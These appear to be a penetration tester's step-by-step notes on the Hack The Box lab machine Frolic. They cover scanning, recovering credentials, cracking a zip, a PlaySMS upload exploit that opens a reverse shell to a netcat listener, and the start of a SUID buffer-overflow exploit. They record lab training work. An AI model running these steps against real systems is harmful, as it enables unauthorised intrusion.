@@ -1,0 +1,566 @@
+Machine-Name :  Frolic
+IP-Address   :  10.129.1.92
+
+Command-Line: sudo nmap -p- -T4 -A 10.129.1.92
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-05 19:19 UTC
+    Nmap scan report for 10.129.1.92
+    Host is up (0.048s latency).
+    Not shown: 65530 closed ports
+    PORT     STATE SERVICE     VERSION
+    22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey:
+    |   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
+    |   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
+    |_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)
+    139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+    445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+    1880/tcp open  http        Node.js (Express middleware)
+    |_http-title: Node-RED
+    9999/tcp open  http        nginx 1.10.3 (Ubuntu)
+    |_http-server-header: nginx/1.10.3 (Ubuntu)
+    |_http-title: Welcome to nginx!
+    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+    TCP/IP fingerprint:
+    OS:SCAN(V=7.91%E=4%D=4/5%OT=22%CT=1%CU=35845%PV=Y%DS=2%DC=T%G=Y%TM=606B62F5
+    OS:%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)OPS(O
+    OS:1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11N
+    OS:W7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R
+    OS:=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
+    OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y
+    OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
+    OS:%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=
+    OS:40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S
+    OS:)
+
+    Network Distance: 2 hops
+    Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+    Host script results:
+    |_clock-skew: mean: -1h49m59s, deviation: 3h10m30s, median: 0s
+    |_nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+    | smb-os-discovery:
+    |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+    |   Computer name: frolic
+    |   NetBIOS computer name: FROLIC\x00
+    |   Domain name: \x00
+    |   FQDN: frolic
+    |_  System time: 2021-04-06T00:50:19+05:30
+    | smb-security-mode:
+    |   account_used: guest
+    |   authentication_level: user
+    |   challenge_response: supported
+    |_  message_signing: disabled (dangerous, but default)
+    | smb2-security-mode:
+    |   2.02:
+    |_    Message signing enabled but not required
+    | smb2-time:
+    |   date: 2021-04-05T19:20:19
+    |_  start_date: N/A
+
+    TRACEROUTE (using port 5900/tcp)
+    HOP RTT      ADDRESS
+    1   49.19 ms 10.10.14.1
+    2   49.38 ms 10.129.1.92
+
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 45.53 seconds
+
+
+Notes: We have 2 ports (1880, 9999) hosting http. Running a DirSearch on both ports.
+
+
+
+HOST: http://frolic.htb:1880:
+
+    Command-Line: ./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt -f -t 50 -i 200,301,302,403 -u http://frolic.htb:1880
+    Result:
+          _|. _ _  _  _  _ _|_    v0.4.1
+         (_||| _) (/_(_|| (_| )
+
+        Extensions: php, txt | HTTP method: GET | Threads: 50 | Wordlist size: 882080
+
+        Error Log: /home/kali/HackingTools/dirsearch/logs/errors-21-04-06_21-34-03.log
+
+        Target: http://frolic.htb:1880/
+
+        Output File: /home/kali/HackingTools/dirsearch/reports/frolic.htb/_21-04-06_21-34-04.txt
+
+        [21:34:04] Starting:
+        [21:34:13] 301 -  173B  - /red  ->  /red/
+        [21:34:18] 301 -  179B  - /vendor  ->  /vendor/
+
+
+
+
+
+HOST: http://frolic.htb:9999:
+
+    Command-Line: ./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt -f -t 50 -i 200,301,302,403 -u http://frolic.htb:9999
+    Result:
+          _|. _ _  _  _  _ _|_    v0.4.1
+         (_||| _) (/_(_|| (_| )
+
+        Extensions: php, txt | HTTP method: GET | Threads: 50 | Wordlist size: 882080
+
+        Error Log: /home/kali/HackingTools/dirsearch/logs/errors-21-04-06_21-34-33.log
+
+        Target: http://frolic.htb:9999/
+
+        Output File: /home/kali/HackingTools/dirsearch/reports/frolic.htb/_21-04-06_21-34-34.txt
+
+        [21:34:34] Starting:
+        [21:34:35] 301 -  194B  - /admin  ->  http://frolic.htb:9999/admin/
+        [21:34:35] 200 -  634B  - /admin/
+        [21:34:37] 301 -  194B  - /test  ->  http://frolic.htb:9999/test/
+        [21:34:37] 200 -   83KB - /test/
+        [21:34:38] 403 -  580B  - /dev/
+        [21:34:38] 301 -  194B  - /dev  ->  http://frolic.htb:9999/dev/
+        [21:34:42] 200 -   28B  - /backup/
+        [21:34:42] 301 -  194B  - /backup  ->  http://frolic.htb:9999/backup/
+        [21:35:30] 301 -  194B  - /loop  ->  http://frolic.htb:9999/loop/
+        [21:35:30] 403 -  580B  - /loop/
+
+
+
+    Browser: http://frolic.htb/9999/admin
+    Notes: Taken to an admin page which says "c'mon i m hackable". Inspecting the source code of the page showed me a file named "js/login.js"
+    File-Contents:
+        var attempt = 3; // Variable to count number of attempts.
+        // Below function Executes on click of login button.
+        function validate(){
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+        if ( username == "admin" && password == "superduperlooperpassword_lol"){
+            alert ("Login successfully");
+            window.location = "success.html"; // Redirecting to other page.
+            return false;
+            }
+        else{
+            attempt --;// Decrementing by one.
+            alert("You have left "+attempt+" attempt;");
+            // Disabling fields after 3 attempts.
+            if( attempt == 0){
+                document.getElementById("username").disabled = true;
+                document.getElementById("password").disabled = true;
+                document.getElementById("submit").disabled = true;
+                return false;
+            }
+          }
+        }
+
+    Notes: Discovered "if ( username == "admin" && password == "superduperlooperpassword_lol"){"
+
+    Notes: Logging in with username "admin" and password "superduperlooperpassword_lol".
+    Result:
+        *** SUCCESSFUL LOGIN ***
+        ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?.
+
+    Google:
+        ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?.
+    Result:
+        URL: https://www.dcode.fr/ook-language
+        Notes: Ook! programming-language.
+        Decoded: "Nothing here check /asdiSIAJJ0QWE9JAS"
+
+    Browser: http://frolic.htb:9999/asdiSIAJJ0QWE9JAS/
+    Result:
+        UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbsK1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkCAAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA
+
+    Command-Line: base64 -d > asdiSIAJJ0QWE9JAS
+    Command-Line: file asdiSIAJJ0QWE9JAS
+    Result:
+        asdiSIAJJ0QWE9JAS: Zip archive data, at least v2.0 to extract
+    Command-Line: mv asdiSIAJJ0QWE9JAS asdiSIAJJ0QWE9JAS.zip
+    Command-Line: unzip asdiSIAJJ0QWE9JAS.zip
+    Result:
+        Archive:  asdiSIAJJ0QWE9JAS.zip
+        [asdiSIAJJ0QWE9JAS.zip] index.php password:
+        password incorrect--reenter:
+        password incorrect--reenter:
+           skipping: index.php               incorrect password
+
+    Command-Line: zip2john asdiSIAJJ0QWE9JAS.zip > asdiSIAJJ0QWE9JAS.zip.hash
+    Result:
+        /asdiSIAJJ0QWE9JAS.zip.hash
+    Command-Line: john --wordlist=/usr/share/wordlist/rockyou.txt
+    Result:
+        Using default input encoding: UTF-8
+        Loaded 1 password hash (PKZIP [32/64])
+        Will run 12 OpenMP threads
+        Press 'q' or Ctrl-C to abort, almost any other key for status
+        password         (asdiSIAJJ0QWE9JAS.zip/index.php)
+        1g 0:00:00:00 DONE (2021-04-06 22:43) 11.11g/s 273066p/s 273066c/s 273066C/s 123456..280690
+        Use the "--show" option to display all of the cracked passwords reliably
+        Session completed
+
+    Command-Line: john --show asdiSIAJJ0QWE9JAS.zip.hash
+    Result:
+        asdiSIAJJ0QWE9JAS.zip/index.php:password:index.php:asdiSIAJJ0QWE9JAS.zip::asdiSIAJJ0QWE9JAS.zip
+
+        1 password hash cracked, 0 left
+    Notes: Password cracked. index.php:password
+
+    Command-Line: unzip asdiSIAJJ0QWE9JAS.zip
+    Password: password
+    Result:
+        inflating: index.php
+    Command-Line: cat index.php
+    Result:
+        4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
+
+    Command-Line: cat index.php | xxd -r -p > index.php.b64
+    Result:
+        /index.php.b64
+
+    Command-Line: cat index.php.b64 | base64 -d
+    Result:
+        +++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
+        ++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
+        <]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
+        ++..<
+
+    Google: decode  +++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
+                    ++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
+                    <]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
+                    ++..<
+
+    Result:
+        URL: https://www.dcode.fr/brainfuck-language
+        Decoded: idkwhatispass
+
+    Notes: Possible password found: idkwhatispass
+
+
+    /BACKUP:
+    Command-Line: ./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt -f -t 50 -i 200,301,302,403 -u http://frolic.htb:9999/backup
+    Result:
+          _|. _ _  _  _  _ _|_    v0.4.1
+     (_||| _) (/_(_|| (_| )
+
+    Extensions: php, txt | HTTP method: GET | Threads: 50 | Wordlist size: 882080
+
+    Error Log: /home/kali/HackingTools/dirsearch/logs/errors-21-04-06_23-30-26.log
+
+    Target: http://frolic.htb:9999/backup/
+
+    Output File: /home/kali/HackingTools/dirsearch/reports/frolic.htb/backup_21-04-06_23-30-26.txt
+
+    [23:30:26] Starting:
+    [23:30:27] 200 -   28B  - /backup/index.php
+    [23:30:27] 200 -   13B  - /backup/user.txt
+    [23:30:29] 200 -   22B  - /backup/password.txt
+    [23:31:30] 301 -  194B  - /backup/loop  ->  http://frolic.htb:9999/backup/loop/
+    [23:31:30] 403 -  580B  - /backup/loop/
+
+    Browser: http://frolic.htb/password.txt
+    Result: imnothuman
+    Notes: Added imnothuman to passwords.txt
+
+
+    /ADMIN:
+    Command-Line: ./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt -f -t 50 -i 200,301,302,403 -u http://frolic.htb:9999/admin
+    Result:
+          _|. _ _  _  _  _ _|_    v0.4.1
+         (_||| _) (/_(_|| (_| )
+
+        Extensions: php, txt | HTTP method: GET | Threads: 50 | Wordlist size: 882080
+
+        Error Log: /home/kali/HackingTools/dirsearch/logs/errors-21-04-06_23-27-31.log
+
+        Target: http://frolic.htb:9999/admin/
+
+        Output File: /home/kali/HackingTools/dirsearch/reports/frolic.htb/admin_21-04-06_23-27-31.txt
+
+        [23:27:31] Starting:
+        [23:27:40] 403 -  580B  - /admin/css/
+        [23:27:40] 301 -  194B  - /admin/css  ->  http://frolic.htb:9999/admin/css/
+        [23:27:44] 301 -  194B  - /admin/js  ->  http://frolic.htb:9999/admin/js/
+        [23:27:44] 403 -  580B  - /admin/js/
+
+    Notes: Nothing Found.
+
+
+    /DEV:
+    Command-Line: ./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt -f -t 50 -i 200,301,302,403 -u http://frolic.htb:9999/dev
+    Result:
+          _|. _ _  _  _  _ _|_    v0.4.1
+         (_||| _) (/_(_|| (_| )
+
+        Extensions: php, txt | HTTP method: GET | Threads: 50 | Wordlist size: 882080
+
+        Error Log: /home/kali/HackingTools/dirsearch/logs/errors-21-04-06_23-29-54.log
+
+        Target: http://frolic.htb:9999/dev/
+
+        Output File: /home/kali/HackingTools/dirsearch/reports/frolic.htb/dev_21-04-06_23-29-55.txt
+
+        [23:29:55] Starting:
+        [23:29:58] 200 -    5B  - /dev/test
+        [23:30:03] 301 -  194B  - /dev/backup  ->  http://frolic.htb:9999/dev/backup/
+        [23:30:03] 200 -   11B  - /dev/backup/
+
+
+    Browser: http://frolic.htb:9999/dev/backup
+    Result: /playsms
+
+
+
+    /TEST:
+    Command-Line: ./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt -f -t 50 -i 200,301,302,403 -u http://frolic.htb:9999/test
+    Result:
+         _|. _ _  _  _  _ _|_    v0.4.1
+        (_||| _) (/_(_|| (_| )
+
+        Extensions: php, txt | HTTP method: GET | Threads: 50 | Wordlist size: 882080
+
+        Error Log: /home/kali/HackingTools/dirsearch/logs/errors-21-04-06_23-28-09.log
+
+        Target: http://frolic.htb:9999/test/
+
+        Output File: /home/kali/HackingTools/dirsearch/reports/frolic.htb/test_21-04-06_23-28-10.txt
+
+        [23:28:10] Starting:
+        [23:28:10] 200 -   83KB - /test/index.php
+
+
+    /LOOP:
+    Command-Line:
+    Result:
+          _|. _ _  _  _  _ _|_    v0.4.1
+         (_||| _) (/_(_|| (_| )
+
+        Extensions: php, txt | HTTP method: GET | Threads: 50 | Wordlist size: 882080
+
+        Error Log: /home/kali/HackingTools/dirsearch/logs/errors-21-04-06_23-30-48.log
+
+        Target: http://frolic.htb:9999/loop/
+
+        Output File: /home/kali/HackingTools/dirsearch/reports/frolic.htb/loop_21-04-06_23-30-48.txt
+
+        [23:30:48] Starting:
+        [23:31:55] 301 -  194B  - /loop/loop  ->  http://frolic.htb:9999/loop/loop/
+        [23:31:55] 403 -  580B  - /loop/loop/
+
+
+
+    Broswer: http://frolic.htb:9999/playsms
+    Result:
+        Url: http://frolic.htb:9999/playsms/index.php?app=main&inc=core_auth&route=login
+    Notes: Login form. Trying to login using username 'admin' with collected passwords.txt file.
+    Result:
+        Username: admin
+        Password: idkwhatispass
+        Result:
+            *** SUCCESSFUL LOGIN ***
+
+
+
+    Command-Line: searchsploit playsms
+    Result:
+    ------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+    PlaySMS - 'import.php' (Authenticated) CSV File Upload Code Execution (Metasploit)                                                                          | php/remote/44598.rb
+    PlaySMS - index.php Unauthenticated Template Injection Code Execution (Metasploit)                                                                          | php/remote/48335.rb
+    PlaySms 0.7 - SQL Injection                                                                                                                                 | linux/remote/404.pl
+    PlaySms 0.8 - 'index.php' Cross-Site Scripting                                                                                                              | php/webapps/26871.txt
+    PlaySms 0.9.3 - Multiple Local/Remote File Inclusions                                                                                                       | php/webapps/7687.txt
+    PlaySms 0.9.5.2 - Remote File Inclusion                                                                                                                     | php/webapps/17792.txt
+    PlaySms 0.9.9.2 - Cross-Site Request Forgery                                                                                                                | php/webapps/30177.txt
+    PlaySMS 1.4 - '/sendfromfile.php' Remote Code Execution / Unrestricted File Upload                                                                          | php/webapps/42003.txt
+    PlaySMS 1.4 - 'import.php' Remote Code Execution                                                                                                            | php/webapps/42044.txt
+    PlaySMS 1.4 - 'sendfromfile.php?Filename' (Authenticated) 'Code Execution (Metasploit)                                                                      | php/remote/44599.rb
+    PlaySMS 1.4 - Remote Code Execution                                                                                                                         | php/webapps/42038.txt
+    PlaySMS 1.4.3 - Template Injection / Remote Code Execution                                                                                                  | php/webapps/48199.txt
+    ------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+
+    Command-Line: searchsploit -m php/webapps/42044.txt
+    Notes: Creating a .csv file to execute PHP code.
+    Result:
+        /payload.csv
+
+    Command-Line: mkdir www
+    Command-Line: cd www
+    Command-Line: cp /usr/share/laudanum/php/php-reverse-shell.php reverse-shell.php
+    Notes: Changed IP to tun0 and port to 9001.
+
+    Command-Line: sudo python3 -m http.server --bind 10.10.14.58 80
+    Command-Line: nc -lvnp 9001
+
+    Notes: Uploaded payload.csv to playsms/
+    Result:
+        *** REVERSE SHELL ***
+
+    www-data@frolic:/home$ cat ayush/user.txt
+    Result: 2ab95909cf509f85a6f476b59a0c2fe0
+        *** USER OWNED ***
+
+    www-data@frolic:/dev/shm$ ./LinEnum.sh
+    Result:
+        OS: Linux version 4.4.0-116-generic (buildd@lgw01-amd64-023) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9) ) #140-Ubuntu SMP Mon Feb 12 21:22:43 UTC 2018
+
+        [+] Active Ports
+        [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
+        tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+        tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -
+        tcp        0      0 0.0.0.0:9999            0.0.0.0:*               LISTEN      1383/nginx: worker
+        tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+        tcp        0      0 0.0.0.0:1880            0.0.0.0:*               LISTEN      -
+        tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -
+        tcp6       0      0 :::139                  :::*                    LISTEN      -
+        tcp6       0      0 :::9999                 :::*                    LISTEN      1383/nginx: worker
+        tcp6       0      0 :::22                   :::*                    LISTEN      -
+        tcp6       0      0 :::445                  :::*                    LISTEN      -
+
+
+        [-] SUID files:
+        -rwsr-xr-x 1 root root 38660 Mar  6  2017 /sbin/mount.cifs
+        -rwsr-xr-x 1 root root 34812 Dec  1  2017 /bin/mount
+        -rwsr-xr-x 1 root root 43316 May  8  2014 /bin/ping6
+        -rwsr-xr-x 1 root root 30112 Jul 12  2016 /bin/fusermount
+        -rwsr-xr-x 1 root root 38932 May  8  2014 /bin/ping
+        -rwsr-xr-x 1 root root 26492 Dec  1  2017 /bin/umount
+        -rwsr-xr-x 1 root root 38900 May 17  2017 /bin/su
+        -rwsr-xr-x 1 root root 157424 Jan 28  2017 /bin/ntfs-3g
+        -rwsr-xr-x 1 root root 7480 Sep 25  2018 /home/ayush/.binary/rop
+        -rwsr-xr-x 1 root root 53128 May 17  2017 /usr/bin/passwd
+        -rwsr-xr-x 1 root root 78012 May 17  2017 /usr/bin/gpasswd
+        -rwsr-xr-x 1 root root 34680 May 17  2017 /usr/bin/newgrp
+        -rwsr-xr-x 1 root root 36288 May 17  2017 /usr/bin/newuidmap
+        -rwsr-xr-x 1 root root 18216 Jan 18  2016 /usr/bin/pkexec
+        -rwsr-sr-x 1 daemon daemon 50748 Jan 15  2016 /usr/bin/at
+        -rwsr-xr-x 1 root root 159852 Jul  4  2017 /usr/bin/sudo
+        -rwsr-xr-x 1 root root 36288 May 17  2017 /usr/bin/newgidmap
+        -rwsr-xr-x 1 root root 39560 May 17  2017 /usr/bin/chsh
+        -rwsr-xr-x 1 root root 48264 May 17  2017 /usr/bin/chfn
+        -rwsr-xr-x 1 root root 13960 Jan 18  2016 /usr/lib/policykit-1/polkit-agent-helper-1
+        -rwsr-sr-x 1 root root 92556 Dec  1  2017 /usr/lib/snapd/snap-confine
+        -rwsr-xr-x 1 root root 5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+        -rwsr-xr-x 1 root root 42396 Jun 15  2017 /usr/lib/i386-linux-gnu/lxc/lxc-user-nic
+        -rwsr-xr-- 1 root messagebus 46436 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+        -rwsr-xr-x 1 root root 513528 Jan 18  2018 /usr/lib/openssh/ssh-keysign
+
+
+    Notes: Found strange SUID in "/ayush".
+
+    www-data@frolic:/dev/shm$ cat /home/ayush/.binary/rop | base64
+    Result:
+        /rop.b64
+
+    Command-Line: base64 -d rop.b64 > rop
+    Command-Line: chmod 755 rop
+    Command-Line: ./rop
+    Result:
+        [*] Usage: program <message>
+
+    Command-Line: ./rop 'hello world'
+    Result:
+        [+] Message sent: hello world
+
+    Command-Line: gdb ./rop
+    Result:
+        gdb-peda$ pattern_create 100
+            'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+        gdb-peda$ r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+            Starting program: /home/kali/HTB/Machines/Frolic_NF/rop 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+
+            Program received signal SIGSEGV, Segmentation fault.
+            [----------------------------------registers-----------------------------------]
+            EAX: 0x79 ('y')
+            EBX: 0xffffd0e0 --> 0x2
+            ECX: 0x0
+            EDX: 0x5f ('_')
+            ESI: 0xf7fb1000 --> 0x1e4d6c
+            EDI: 0xf7fb1000 --> 0x1e4d6c
+            EBP: 0x31414162 ('bAA1')
+            ESP: 0xffffd0b0 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
+            EIP: 0x41474141 ('AAGA')
+            EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+            [-------------------------------------code-------------------------------------]
+            Invalid $PC address: 0x41474141
+            [------------------------------------stack-------------------------------------]
+            0000| 0xffffd0b0 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
+            0004| 0xffffd0b4 ("2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
+            0008| 0xffffd0b8 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
+            0012| 0xffffd0bc ("A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
+            0016| 0xffffd0c0 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
+            0020| 0xffffd0c4 ("AA4AAJAAfAA5AAKAAgAA6AAL")
+            0024| 0xffffd0c8 ("AJAAfAA5AAKAAgAA6AAL")
+            0028| 0xffffd0cc ("fAA5AAKAAgAA6AAL")
+            [------------------------------------------------------------------------------]
+            Legend: code, data, rodata, value
+            Stopped reason: SIGSEGV
+            0x41474141 in ?? ()
+        gdb-peda$ pattern_offset AAGA
+            AAGA found at offset: 52
+
+
+    www-data@frolic:/dev/shm$ cd /home/ayush/.binary/
+    www-data@frolic:/home/ayush/.binary$ ldd rop
+    Result:
+        linux-gate.so.1 =>  (0xb7fda000)
+        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
+        /lib/ld-linux.so.2 (0xb7fdb000)
+
+    Notes: libc address => 0xb7e19000
+    www-data@frolic:/home/ayush/.binary$ gdb ./rop
+    Result:
+        The program 'gdb' is currently not installed. To run 'gdb' please ask your administrator to install the package 'gdb'
+
+    www-data@frolic:/home/ayush/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 |grep system
+    Result:
+       245: 00112f20    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
+       627: 0003ada0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
+      1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
+
